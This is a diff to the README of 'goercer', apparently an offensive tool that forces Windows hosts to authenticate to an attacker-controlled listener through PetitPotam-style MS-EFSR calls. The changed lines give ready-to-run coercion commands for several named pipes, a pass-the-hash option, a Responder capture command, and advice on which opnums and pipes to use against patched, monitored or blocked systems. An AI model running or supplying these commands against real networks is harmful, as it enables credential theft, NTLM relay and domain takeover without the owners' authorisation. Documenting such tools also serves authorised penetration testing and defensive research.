@@ -193,7 +193,7 @@ All flags use the modern GNU-style format with short (`-t`) and long (`--target`
   - **Recommendation**: Use this pipe for modern Windows targets
 
 **For older Windows (Server 2016-2022):**
-- `lsarpc`: Default, most compatible - Uses UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
+- `lsarpc`: For older systems, most compatible with legacy Windows - Uses UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`
   - All 6 opnums work on unpatched/partially patched systems
 - `samr`: Security Account Manager Remote (tested, works with all 6 opnums)
 - `netlogon`: Netlogon service pipe (tested, works with all 6 opnums)
@@ -336,7 +336,7 @@ sudo responder -I eth0 -v
 # Uses opnum 0 (EfsRpcOpenFileRaw) and opnum 4 (EfsRpcEncryptFileSrv)
 # Native MS-EFSR UUID: df1941c5-fe89-4e79-bf10-463657acf44d
 
-# PetitPotam with default pipe (lsarpc) - BEST FOR OLDER SYSTEMS (6 opnums)
+# PetitPotam with default pipe (efsrpc) - UNIVERSAL (all Windows versions)
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
 
 # PetitPotam with pass-the-hash
@@ -470,8 +470,8 @@ Callbacks: 1 per execution
 - **Compatibility**: **All Windows versions** - 100% success rate across tested systems
 
 **Legacy Method (Blocked on Win11/Server2025):**
-- **Default Pipe**: `\pipe\lsarpc`
-- **Alternative Pipes**: `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (all work with all 6 opnums)
+- **Legacy Pipes**: `\pipe\lsarpc`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (all work with all 6 opnums)
+- Use `--pipe lsarpc` to force legacy pipe on older systems
 - **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0 (compatibility shim)
 - **Opnums** (6 different functions for maximum success rate): 
   - 0: EfsRpcOpenFileRaw (often patched)
@@ -569,7 +569,7 @@ Unlike the original PetitPotam PoC which only tries 2 opnums (0 and 4), this imp
 **Alternative Pipe Flexibility**:
 ```bash
 # Try different pipes if one is monitored/blocked
-./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsarpc   # Default (always available)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsarpc   # Legacy (older systems)
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe samr     # SAM pipe
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe netlogon # Netlogon pipe
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe lsass    # LSASS pipe
